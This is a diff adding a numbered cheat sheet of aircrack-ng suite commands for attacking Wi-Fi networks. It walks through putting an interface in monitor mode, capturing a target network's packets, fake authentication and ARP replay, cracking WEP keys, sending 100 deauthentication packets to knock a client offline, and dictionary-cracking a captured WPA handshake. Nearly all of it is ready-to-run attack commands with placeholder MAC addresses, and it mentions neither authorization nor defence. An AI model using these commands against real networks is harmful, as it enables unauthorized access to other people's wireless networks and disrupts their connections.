@@ -1,0 +1,38 @@
+1. Switching Network Interface to Monitor Mode:
+ airmon-ng start wlan0
+
+2. Executing airmon-ng 
+check kill ensures that network managers or other processes do not
+ hinder the monitoring process.
+
+3.  Scanning for wireless networks: airodump-ng wlan0mon would display all wireless networks
+ visible to the 'wlan0mon' interface
+
+4. airodump-ng --band a wlan0mon :  would scan for networks only in the 5 GHz (band a)
+ frequency range
+
+5. airodump-ng --bssid 00:11:22:33:44:55 -c 6 --write 
+output wlan0mon :  will capture packets from the network with BSSID
+ 00:11:22:33:44:55 on channel 6 and save them to a file named 'output'.
+
+6. airodump-ng --bssid 00:11:22:33:44:55 --encrypt WPA2 wlan0mon : will focus on capturing data
+ from a WPA2 encrypted network with the specified BSSID.
+
+7. aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0mon : simulates a client
+ joining the network, necessary for certain types of attacks.
+
+8.  aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0mon :  targets a specific network to accelerate data capture.
+
+9. aircrack-ng captured_data.cap : will analyze
+ the captured packets and attempt to derive the WEP key, leveraging any
+ vulnerabilities in the WEP encryption.
+
+10. aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon : will
+ send 100 deauth packets to disconnect a device with MAC
+ 66:77:88:99:AA:BB from the network with BSSID 00:11:22:33:44:55.
+
+11. aircrack-ng -w wordlist.txt captured_handshake.cap :  will try to match
+ the network password against the words in 'wordlist.txt' using the data in
+ 'captured_handshake.cap'. This method's success largely depends on the
+ strength of the dictionary file and the complexity of the network
+ password.
